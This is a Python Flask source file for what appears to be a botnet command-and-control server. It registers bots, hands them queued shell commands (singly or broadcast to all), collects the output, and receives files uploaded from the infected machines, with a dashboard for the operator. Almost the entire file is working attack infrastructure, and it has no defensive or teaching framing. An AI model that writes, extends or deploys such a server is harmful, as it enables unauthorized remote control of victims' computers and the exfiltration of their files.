from flask import Flask, request, render_template, redirect
import datetime

app = Flask(__name__)

bots = {}
commands = {}

@app.route('/')
def home():
    return redirect('/dashboard')

from flask import Flask, request, render_template, redirect, send_from_directory
import os

UPLOAD_DIR = os.path.join(os.getcwd(), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/upload/<bot_id>', methods=['POST'])
def receive_file(bot_id):
    file = request.files['file']
    filepath = os.path.join(UPLOAD_DIR, f"{bot_id}_{file.filename}")
    file.save(filepath)
    print(f"[+] File received from {bot_id}: {file.filename}")
    return "uploaded"

@app.route('/files/<path:filename>')
def serve_file(filename):
    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)

@app.route('/register', methods=['POST'])
def register():
    bot_id = request.json.get('bot_id')
    bots[bot_id] = {"last_seen": str(datetime.datetime.now()), "results": []}
    print(f"[+] Bot registered: {bot_id}")
    return {"status": "registered"}

@app.route('/get_command', methods=['POST'])
def get_command():
    bot_id = request.json.get('bot_id')
    bots[bot_id]["last_seen"] = str(datetime.datetime.now())
    cmd = commands.pop(bot_id, "")
    return {"command": cmd}

@app.route('/post_result', methods=['POST'])
def post_result():
    bot_id = request.json.get('bot_id')
    result = request.json.get('result')
    bots[bot_id]["results"].append((str(datetime.datetime.now()), result))
    print(f"\n[Result from {bot_id}]:\n{result}\n")
    return {"status": "received"}

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html', bots=bots)

@app.route('/send_command', methods=['POST'])
def send_command():
    bot_id = request.form['bot_id']
    command = request.form['command']
    commands[bot_id] = command
    return redirect('/dashboard')

@app.route('/send_all', methods=['POST'])
def send_all():
    command = request.form['command']
    for bot_id in bots:
        commands[bot_id] = command
    return redirect('/dashboard')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
